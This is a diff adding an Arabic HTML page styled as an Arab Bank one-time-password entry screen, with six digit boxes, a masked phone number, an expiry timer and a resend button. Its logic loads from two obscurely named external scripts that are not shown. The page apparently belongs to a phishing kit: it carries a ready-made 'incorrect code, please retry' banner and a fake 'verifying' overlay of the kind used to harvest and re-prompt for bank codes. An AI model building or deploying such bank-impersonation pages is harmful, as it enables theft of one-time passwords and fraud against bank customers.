@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البنك العربي - رمز التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: #f2f4f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .phone-frame {
+            width: 390px;
+            min-height: 844px;
+            background: #f2f4f7;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            background: #1a56a0;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            min-height: 54px;
+        }
+
+        .header-title {
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        .close-btn {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-btn svg { width: 22px; height: 22px; }
+
+        .content {
+            flex: 1;
+            padding: 30px 24px 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a2e;
+            text-align: right;
+            margin-bottom: 8px;
+        }
+
+        .section-desc {
+            font-size: 13px;
+            font-weight: 400;
+            color: #555;
+            text-align: right;
+            line-height: 1.7;
+            margin-bottom: 20px;
+            direction: rtl;
+        }
+
+        .section-desc .phone-number {
+            color: #1a56a0;
+            font-weight: 600;
+        }
+
+        #decline-message {
+            display: none;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 15px rgba(238,90,111,0.3);
+            animation: slideDown 0.3s ease-out;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            direction: ltr;
+            margin-bottom: 28px;
+        }
+
+        .otp-box {
+            width: 52px;
+            height: 58px;
+            border: 1.5px solid #d0d7e2;
+            border-radius: 18px;
+            background: #ffffff;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            color: #1a1a2e;
+            font-family: 'Cairo', sans-serif;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            caret-color: #1a56a0;
+        }
+
+        .otp-box:focus {
+            border-color: #1a56a0;
+            box-shadow: 0 0 0 3px rgba(26, 86, 160, 0.13);
+        }
+
+        .otp-box.filled  { border-color: #1a56a0; }
+
+        .otp-box.success {
+            border-color: #27ae60;
+            background: #f0fff4;
+            box-shadow: 0 0 0 3px rgba(39, 174, 96, 0.15);
+        }
+
+        .timer-row {
+            text-align: center;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        .timer-row span {
+            font-weight: 600;
+            color: #1a1a2e;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        .resend-row {
+            text-align: center;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .resend-row button {
+            background: none;
+            border: none;
+            color: #1a56a0;
+            font-weight: 700;
+            font-size: 13px;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+        }
+
+        .resend-row button:disabled { color: #aaa; cursor: not-allowed; }
+        .resend-row button:not(:disabled):hover { text-decoration: underline; }
+
+        #loadingOverlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(255,255,255,0.75);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+
+        #loadingOverlay.show { display: flex; }
+
+        .spin {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #d0d7e2;
+            border-top-color: #1a56a0;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        #loadingOverlay h5 { color:#1a1a2e; margin-top:14px; font-size:15px; }
+        #loadingOverlay p  { color:#666; font-size:13px; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @media (max-width: 480px) { .phone-frame { width: 100%; min-height: 100vh; } }
+    </style>
+</head>
+<body>
+<div class="phone-frame">
+
+    <div id="loadingOverlay">
+        <div class="spin"></div>
+        <h5>جاري التحقق...</h5>
+        <p>يرجى الانتظار</p>
+    </div>
+
+    <div class="header">
+        <div class="header-title">الرقم السري المتغير (OTP)</div>
+        <button class="close-btn" aria-label="إغلاق">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="18" y1="6" x2="6" y2="18"/>
+                <line x1="6" y1="6" x2="18" y2="18"/>
+            </svg>
+        </button>
+    </div>
+
+    <div class="content">
+        <div class="section-title">الرقم السري المتغير (OTP)</div>
+        <div class="section-desc">
+            تم إرسال رمز التحقق إلى رقم الهاتف
+            <span class="phone-number" id="maskedPhoneNumber">01*******</span>
+        </div>
+
+        <div id="decline-message">
+            <div style="display:flex;align-items:center;gap:12px;">
+                <div style="width:42px;height:42px;background:rgba(255,255,255,0.25);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                </div>
+                <div style="flex:1;text-align:right;">
+                    <div style="color:white;font-size:15px;font-weight:600;margin-bottom:4px;">رمز التحقق غير صحيح</div>
+                    <div style="color:rgba(255,255,255,0.9);font-size:13px;line-height:1.5;">يرجى التحقق من الرمز المرسل وإعادة المحاولة</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="otp-container">
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+            <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
+        </div>
+
+        <div class="timer-row">تنتهي الصلاحية خلال: <span id="timer">05:00</span> دقائق</div>
+        <div class="resend-row">لم تتلق الرمز؟ <button id="resendBtn" disabled>إعادة الإرسال</button></div>
+    </div>
+
+</div>
+
+<script src="js/a4.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
